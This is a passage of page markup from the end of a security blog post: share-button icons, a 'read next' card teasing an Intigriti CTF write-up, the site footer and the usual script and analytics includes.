1.4428572-1.6733766 1.8069806-2.2146104.3220779-.4818182.7355519-.7271104 1.2277597-.7271104.3012987.0.5845779.0926948.849026.1876624.6030564.2170398 3.8043369 1.7879312 4.3216328 2.0413055l.0686269.0335321c.4774351.2292208.8545455.4102273 1.0733766.7699676.3194805.5290584.1928572 1.9868506-.2873376 3.3211038-.609578 1.6939936-3.2894481 3.0826299-4.5089286 3.1907468l-.1788961.0170455c-.2819805.0277597-.6016234.0590909-1.000974.0590909l-.0944191-5452e-7c-.9658464-.0112678-2.6415309-.2079278-6.0576913-1.5725068-3.6667208-1.4647727-7.2837663-4.6050325-10.1852273-8.8423701-.0501623-.0733766-.0847403-.124513-.1035714-.1496753-.7576299-.998539-2.5222403-3.624026-2.5222403-6.4047078.0-3.0896104 1.4788961-4.8464286 2.3530844-5.397565.8243507-.5196428 2.6887987-.7650974 3.0311689-.7795454.0351461-.0014814.0648513-.0027775.0900577-.0039117l.1047884-.0050457c.0548951-.0028933.0444193-.0028933.0863227-.0028933z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li><li><a href="/cdn-cgi/l/email-protection#013e7274636b6462753c56514c4d2433314c746d75686d686f6674606d243331424c5224333140747569646f75686260756465243331426e6f7573686374756e7324336324333153646c6e7564243331426e6564243331447964627475686e6f243331243339534244243338243331776860243331557668662433315264737764732c5268656424333155646c716d607564243331486f6b646275686e6f2433312433395252554824333827636e65783c56514c4d2433314c746d75686d686f6674606d243331424c5224333140747569646f75686260756465243331426e6f7573686374756e7324336324333153646c6e7564243331426e6564243331447964627475686e6f243331243339534244243338243331776860243331557668662433315264737764732c5268656424333155646c716d607564243331486f6b646275686e6f24333124333952525548243338243160243160756d65732432632433315264737764732c5268656424333155646c716d607564243331486f6b646275686e6f2433312433395252554824333824333168722433316e6f642433316e672433316c782433316760776e7368756424333177746d6f64736063686d6875686472243362243331637475243331736073646d78243331656e2433314824333172646424333168752433316e7475726865642433316e67243331425547243331626e6c7164756875686e6f7224333769646d6d687124326324316055696424333156514c4d2433314c746d75686d686f6674606d243331424c52243331516d7466686f243331676e73243331566e7365517364727224333174726465243331637824333124643324393124603724316024316024336776716c6d2c7362642c7768602c757668662c72727568243367243160" target=_blank><svg height="50" viewBox="0 0 50 50" width="50"><g fill="none" fill-rule="evenodd"><path d="m46.149789 6H3.85021097c-2.12025316.0-3.85021097 1.72995781-3.85021097 3.85021097V39.6392405c0 2.1202532 1.72995781 3.850211 3.85021097 3.850211H46.149789c2.1202532.0 3.850211-1.7299578 3.850211-3.850211V9.85021097C50 7.72995781 48.2700422 6 46.149789 6zm-.5590717 2.84810127L25.2637131 26.2320675 4.93670886 8.84810127zm1.5611814 30.79113923c0 .5485232-.4535865 1.0021097-1.0021097 1.0021097h-42.29957803c-.54852321.0-1.0021097-.4535865-1.0021097-1.0021097V10.8101266L24.335443 29.185654c.0105486.0105485.0316456.0210971.0421941.0316456.0105486.0105485.0316456.021097.0421941.0316455.0316456.0210971.0527426.0421941.0843882.0527427.0105485.0105485.0210971.0105485.0316456.021097.0421941.0210971.0843882.0421941.1265823.0632911.0105485.0.021097.0105486.0316455.0105486.0316456.0105485.0632912.0316455.1054853.0421941.0105485.0.0316455.0105485.0421941.0105485.0316455.0105485.0632911.021097.0949367.021097.0105485.0.0316455.0105486.0421941.0105486.0316455.0105485.0738396.0105485.1054852.021097h.0316456c.042194.0.0949367.0105485.1371308.0105485.042194.0.0949367.0.1371308-.0105485h.0316455c.0316456.0.0738397-.0105485.1054853-.021097.0105485.0.0316455-.0105486.0421941-.0105486.0316455-.0105485.0632911-.021097.0949367-.021097.0105485.0.0316455-.0105485.0421941-.0105485.0316455-.0105486.0632911-.0210971.1054852-.0421941.0105485.0.021097-.0105486.0316456-.0105486.042194-.021097.0843881-.042194.1265822-.0632911.0105486-.0105485.0210971-.0105485.0316456-.021097.0316456-.0210971.0527426-.0316456.0843882-.0527427.0105485-.0105485.0316456-.021097.0421941-.0316455s.0316456-.0210971.0421941-.0316456l20.9810126-17.9219409z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li></ul></nav><style>.sharebuttons,.sharebuttons ul{display:flex;margin:.25rem 0;align-items:center}.sharebuttons span{color:#bbb}.sharebuttons ul{padding-left:0!important}.sharebuttons ul li{list-style:none;margin:0}.sharebuttons ul li a{margin:0 .5rem;display:block}.sharebuttons ul li:first-child a{margin:0 .2rem 0 .5rem}.sharebuttons ul li a svg{width:auto;height:1.1rem;display:block}.will-change{transition:250ms}nav.sharebuttons li>a:hover .will-change{fill:#444}</style></section></article></main><aside class=read-more-wrap><div class="read-more inner"><article class=read-next-card><div class=read-next-card-content></ul></div></article><article class=post-card><a class=post-card-image-link href=/intigriti-august-2024-ctf/><img class=post-card-image src=/content/images/2024/08/cspt2.jpeg alt="Intigriti August 2024 CTF Defcon Challenge: Safe Notes"></a><div class=post-card-content><a class=post-card-content-link href=/intigriti-august-2024-ctf/><header class=post-card-header><div class=post-card-primary-tag>Hacking</div><h2 class=post-card-title>Intigriti August 2024 CTF Defcon Challenge: Safe Notes</h2></header><div class=post-card-excerpt><p>tldr; This challenge was fun and engaging, blending CSPT with an open redirect flaw to ultimately pull off a successful XSS attack and grab the flag!</p></div></a><footer class=post-card-meta><ul class=author-list><li class=author-list-item><a href=/authors/stealthcopter class=static-avatar><img class=author-profile-image src=/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png alt=stealthcopter></a></li></ul><div class=post-card-byline-content><span class=post-card-byline-author><a href=/authors/stealthcopter>stealthcopter
</a></span><span class=post-card-byline-date><time datetime=2024-88-08>15 August 2024</time>
<span class=bull>&bull;</span> 5 min read</span></div></footer></div></article></div></aside></div><footer class="site-footer outer"><div class=inner><section class=copyright><a href=/>stealthcopter</a> &copy; 2024</section><nav class=site-footer-nav><ul class=nav><a href=/>Latest Posts</a></ul></nav><div><a href=/about>About</a></div></footer></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src=https://code.jquery.com/jquery-3.5.1.min.js integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin=anonymous></script><script src=/built/casper.js></script><script>$(document).ready(function(){$(".gh-burger").click(function(){$("body").toggleClass("gh-head-open")}),$(".gh-content").fitVids()})</script><script type=text/javascript src=/js/lightbox.js></script><link rel=stylesheet href=/css/lightbox.css><noscript><img src=https://analytics.stealthcopter.com/ingress/a7d59cbc-f84e-45b7-974f-aec87e055248/pixel.gif></noscript><script defer src="https://analytics.stealthcopter.com/ingress/a7d59cbc-f84e-45b7-974f-aec87e055248/script.js?v=3"></script></body></html>